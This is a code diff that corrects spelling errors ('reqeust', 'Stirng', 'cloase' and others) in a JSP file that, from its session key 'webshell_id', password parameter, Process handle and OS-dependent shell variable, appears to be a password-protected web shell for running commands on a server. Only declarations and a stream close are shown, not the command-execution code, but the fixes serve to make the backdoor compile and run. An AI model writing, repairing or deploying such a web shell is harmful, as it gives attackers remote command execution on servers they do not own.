@@ -5,12 +5,12 @@
     Process ps = null;
     BufferedReader br = null;
     String line = "";
-    String reesult = "";
-    String current_page = reqeust.getServletPath();
+    String result = "";
+    String current_page = request.getServletPath();
     String password = "";
     String input_password = request.getParameter("password");
     String id = (String)session.getAttribute("webshell_id");
-    Stirng os = System.getProperty("os.name").toLowerCase();
+    String os = System.getProperty("os.name").toLowerCase();
     String shell = "";
 
     try {
@@ -51,7 +51,7 @@
         }
 
     } finally {
-        if(br != null) br.cloase();
+        if(br != null) br.close();
     }
 %>
 <script>
